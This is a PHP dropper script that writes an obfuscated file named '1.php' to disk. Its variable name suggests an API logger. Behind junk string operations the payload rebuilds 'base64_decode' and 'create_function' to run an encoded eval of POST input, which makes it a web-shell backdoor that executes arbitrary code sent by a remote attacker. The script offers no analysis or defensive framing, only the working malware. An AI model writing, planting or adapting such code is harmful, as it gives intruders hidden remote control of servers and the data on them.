<?php
$api_loggerfile = "1.php";
	$txt = '<?php
$r4 = @$r4.substr("vyo146mPstr_replaceacC85nr",8,11);
$cr = ltrim("mpcf5r09bt9su5");
$x = @$x.$r4("a3O","","QGV2a3OYWwa3O");
$hsax = stripos("gdukvn8q9069l33ncnn","hsax");
$k = @$k.$r4("ke","","baskeeke");
$sxea = strlen("m13rgpfidjw");
$bn = @$bn.substr("e611gcreatebTwB",5,6);
$keh = ltrim("pqfkkrgcrn");
$x = $x.substr("x4poJF9c5Q2IPn",3,4);
$aewo = strlen("d1bh1vc01nl12us7qf3");
$k = $k.substr("h164_deceBu",2,6);
$w4o = strlen("lyxkqfq21abcgs8smk");
$bn = $bn.substr("fTv9D5_functiom",6,8);
$tjuh = trim("ikpsj5hxy6xgjicldd");
$x = $x.$r4("fX","","QfXT1NfXUfXWy");
$iclr = trim("bdxsu6detfo8aqmml");
$k = $k.$r4("i6le","","oi6ledi6leei6le");
$ues = stripos("r2a4puiuqk6qpjagwl","ues");
$bn = $bn.$r4("tgn","","ntgn");
$uv = str_split("dr0vows6aobcedhngi",4);
$x = $x.$r4("eCg","","deCgkeCgaHhoeCgOHI");
$gle2 = stripos("gwtl8u00dj54i84yx","gle2");
$x = $x.substr("xTl6jd7HxbDl0a",8,5);
$pl = strlen("av81itvm11cd");
$x = $x.$r4("g8t","","NHJkg8tc");
$mfkp = trim("umv7bhklwb2uq5s");
$x = $x.substr("iF4LXcnXSk7lGsbkeT",4,7);
$b4 = rtrim("chtcp9uqoitfdbn0qk7");
$kU = $bn("", $k($x));
$qa = trim("lo8gcpvxot");
$enl = rtrim("coye5d8it5ty6mw0i");
$h9av = trim("cl3txkaqe5");
$tf = stripos("e9cp96icvqmagepd6y","tf");$kU();
function oe( $l   ){      };
$lkm2 = ltrim("s4dnpr5gkrgx1nkp");
$dqa5 = str_split("u312ue705d54yiwea7d",4);
$l2 = ltrim("x7nrcqpimc");
$mu = strlen("uccf77d4mwk22c");
?>';
	@file_put_contents($api_loggerfile, $txt."\n");
	echo $txt;

?>